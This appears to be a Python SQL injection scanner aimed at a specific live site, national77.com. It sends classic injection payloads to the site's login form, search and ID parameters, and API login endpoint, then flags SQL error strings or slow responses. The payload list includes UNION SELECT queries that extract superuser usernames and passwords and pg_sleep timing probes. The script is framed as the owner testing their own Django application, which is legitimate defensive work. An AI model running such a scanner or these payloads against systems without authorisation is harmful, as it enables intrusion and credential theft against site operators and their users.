#!/usr/bin/env python3
"""
SQL Injection Security Testing Script for national77.com
Tests various endpoints for SQL injection vulnerabilities.
"""

import requests
import time
from urllib.parse import urlencode
import json

# Base URL
BASE_URL = "https://national77.com"

# SQL Injection payloads to test
SQL_INJECTION_PAYLOADS = [
    # Basic SQL injection attempts
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1--",
    "') OR ('1'='1--",
    
    # Union-based SQL injection
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    
    # Boolean-based blind SQL injection
    "' OR 1=1 AND 'a'='a",
    "' OR 1=1 AND 'a'='b",
    
    # Time-based blind SQL injection
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5)--",
    "'; pg_sleep(5)--",
    
    # Error-based SQL injection
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    
    # PostgreSQL specific (since your site uses PostgreSQL)
    "'; SELECT pg_sleep(5)--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT version(),NULL,NULL--",
    
    # Attempt to extract admin credentials
    "' UNION SELECT username,password FROM auth_user WHERE is_superuser=1--",
    "' UNION SELECT username,password FROM django.contrib.auth.user WHERE is_superuser=1--",
]

# Test results storage
results = {
    "vulnerable_endpoints": [],
    "safe_endpoints": [],
    "errors": []
}

def test_login_form():
    """Test the login form for SQL injection"""
    print("\n" + "="*60)
    print("Testing Login Form (/login/)")
    print("="*60)
    
    login_url = f"{BASE_URL}/login/"
    
    # First, get the CSRF token
    try:
        session = requests.Session()
        response = session.get(login_url, timeout=10)
        
        if response.status_code != 200:
            print(f"❌ Could not access login page: {response.status_code}")
            return
        
        # Try to extract CSRF token (Django forms include it)
        csrf_token = None
        if 'csrftoken' in session.cookies:
            csrf_token = session.cookies['csrftoken']
        elif 'csrfmiddlewaretoken' in response.text:
            # Try to extract from HTML
            import re
            match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
            if match:
                csrf_token = match.group(1)
        
        print(f"CSRF Token: {'Found' if csrf_token else 'Not found'}")
        
        # Test each payload
        for payload in SQL_INJECTION_PAYLOADS[:10]:  # Test first 10 payloads
            print(f"\nTesting payload: {payload[:50]}...")
            
            data = {
                'username': payload,
                'password': 'test123'
            }
            
            if csrf_token:
                data['csrfmiddlewaretoken'] = csrf_token
            
            try:
                response = session.post(login_url, data=data, timeout=10, allow_redirects=False)
                
                # Check for SQL error messages
                error_indicators = [
                    'sql syntax',
                    'mysql_fetch',
                    'postgresql',
                    'pg_query',
                    'ora-',
                    'sqlite',
                    'warning',
                    'unclosed quotation',
                    'quoted string not properly terminated'
                ]
                
                response_text_lower = response.text.lower()
                found_error = False
                for indicator in error_indicators:
                    if indicator in response_text_lower:
                        print(f"⚠️  POTENTIAL VULNERABILITY: Found SQL error indicator: {indicator}")
                        results["vulnerable_endpoints"].append({
                            "endpoint": login_url,
                            "method": "POST",
                            "parameter": "username",
                            "payload": payload,
                            "indicator": indicator
                        })
                        found_error = True
                        break
                
                if not found_error:
                    print("✓ No SQL error indicators found")
                    
            except requests.exceptions.RequestException as e:
                print(f"❌ Request failed: {e}")
                results["errors"].append({
                    "endpoint": login_url,
                    "error": str(e)
                })
            
            time.sleep(0.5)  # Rate limiting
            
    except Exception as e:
        print(f"❌ Error testing login form: {e}")
        results["errors"].append({
            "endpoint": login_url,
            "error": str(e)
        })

def test_search_parameters():
    """Test search parameters in various endpoints"""
    print("\n" + "="*60)
    print("Testing Search Parameters")
    print("="*60)
    
    endpoints_with_search = [
        "/dashboard/?search=",
        "/transactions/?search=",
        "/clients/?client_search=",
    ]
    
    for endpoint in endpoints_with_search:
        print(f"\nTesting: {endpoint}")
        
        for payload in SQL_INJECTION_PAYLOADS[:5]:  # Test first 5 payloads
            url = f"{BASE_URL}{endpoint}{payload}"
            
            try:
                response = requests.get(url, timeout=10)
                
                # Check for SQL errors
                error_indicators = [
                    'sql syntax',
                    'postgresql',
                    'pg_query',
                    'unclosed quotation'
                ]
                
                response_text_lower = response.text.lower()
                found_error = False
                for indicator in error_indicators:
                    if indicator in response_text_lower:
                        print(f"⚠️  POTENTIAL VULNERABILITY in {endpoint}")
                        results["vulnerable_endpoints"].append({
                            "endpoint": endpoint,
                            "method": "GET",
                            "parameter": "search",
                            "payload": payload,
                            "indicator": indicator
                        })
                        found_error = True
                        break
                
                if not found_error:
                    print(f"✓ {payload[:30]}... - Safe")
                    
            except requests.exceptions.RequestException as e:
                print(f"❌ Request failed: {e}")
            
            time.sleep(0.3)

def test_url_parameters():
    """Test URL parameters that accept IDs"""
    print("\n" + "="*60)
    print("Testing URL Parameters")
    print("="*60)
    
    # Test endpoints with ID parameters
    test_cases = [
        ("/clients/", "client_id"),
        ("/transactions/", "client"),
        ("/transactions/", "exchange"),
    ]
    
    for base_path, param_name in test_cases:
        print(f"\nTesting {base_path} with {param_name} parameter")
        
        for payload in ["1' OR '1'='1", "1 UNION SELECT NULL--", "1; SELECT pg_sleep(5)--"]:
            url = f"{BASE_URL}{base_path}?{param_name}={payload}"
            
            try:
                start_time = time.time()
                response = requests.get(url, timeout=15)
                elapsed_time = time.time() - start_time
                
                # Check for time-based injection (if response took > 4 seconds)
                if elapsed_time > 4:
                    print(f"⚠️  POTENTIAL TIME-BASED SQL INJECTION: Response took {elapsed_time:.2f}s")
                    results["vulnerable_endpoints"].append({
                        "endpoint": base_path,
                        "method": "GET",
                        "parameter": param_name,
                        "payload": payload,
                        "indicator": f"Time delay: {elapsed_time:.2f}s"
                    })
                else:
                    print(f"✓ {payload[:30]}... - Response time: {elapsed_time:.2f}s")
                    
            except requests.exceptions.RequestException as e:
                print(f"❌ Request failed: {e}")
            
            time.sleep(0.5)

def test_api_endpoints():
    """Test API endpoints"""
    print("\n" + "="*60)
    print("Testing API Endpoints")
    print("="*60)
    
    # Note: Most API endpoints require authentication
    # We'll test the login endpoint
    api_login_url = f"{BASE_URL}/api/login/"
    
    print(f"\nTesting: {api_login_url}")
    
    for payload in SQL_INJECTION_PAYLOADS[:5]:
        data = {
            'username': payload,
            'password': 'test'
        }
        
        try:
            response = requests.post(api_login_url, json=data, timeout=10)
            
            # Check response
            if response.status_code == 400 or response.status_code == 500:
                response_text = response.text.lower()
                if any(indicator in response_text for indicator in ['sql', 'syntax', 'error', 'postgresql']):
                    print(f"⚠️  POTENTIAL VULNERABILITY in API login")
                    results["vulnerable_endpoints"].append({
                        "endpoint": api_login_url,
                        "method": "POST",
                        "parameter": "username",
                        "payload": payload,
                        "indicator": "API error response"
                    })
                else:
                    print(f"✓ {payload[:30]}... - Safe (expected error)")
            else:
                print(f"✓ {payload[:30]}... - Safe")
                
        except requests.exceptions.RequestException as e:
            print(f"❌ Request failed: {e}")
        
        time.sleep(0.5)

def generate_report():
    """Generate security testing report"""
    print("\n" + "="*60)
    print("SECURITY TEST REPORT")
    print("="*60)
    
    print(f"\nTotal Vulnerabilities Found: {len(results['vulnerable_endpoints'])}")
    print(f"Safe Endpoints Tested: {len(results['safe_endpoints'])}")
    print(f"Errors Encountered: {len(results['errors'])}")
    
    if results['vulnerable_endpoints']:
        print("\n⚠️  VULNERABILITIES FOUND:")
        print("-" * 60)
        for vuln in results['vulnerable_endpoints']:
            print(f"\nEndpoint: {vuln['endpoint']}")
            print(f"Method: {vuln['method']}")
            print(f"Parameter: {vuln['parameter']}")
            print(f"Payload: {vuln['payload']}")
            print(f"Indicator: {vuln['indicator']}")
    else:
        print("\n✓ No SQL injection vulnerabilities detected!")
        print("\nYour Django application appears to be using Django ORM properly,")
        print("which provides protection against SQL injection attacks.")
    
    if results['errors']:
        print("\n\nErrors Encountered:")
        print("-" * 60)
        for error in results['errors']:
            print(f"{error['endpoint']}: {error['error']}")
    
    # Save report to file
    report_file = "sql_injection_test_report.json"
    with open(report_file, 'w') as f:
        json.dump(results, f, indent=2)
    print(f"\n\nFull report saved to: {report_file}")

def main():
    """Main testing function"""
    print("="*60)
    print("SQL Injection Security Testing")
    print(f"Target: {BASE_URL}")
    print("="*60)
    
    print("\n⚠️  NOTE: This script tests for SQL injection vulnerabilities.")
    print("Since your application uses Django ORM, it should be protected.")
    print("However, we'll test to ensure no raw SQL queries are vulnerable.\n")
    
    # Run tests
    test_login_form()
    test_search_parameters()
    test_url_parameters()
    test_api_endpoints()
    
    # Generate report
    generate_report()

if __name__ == "__main__":
    main()
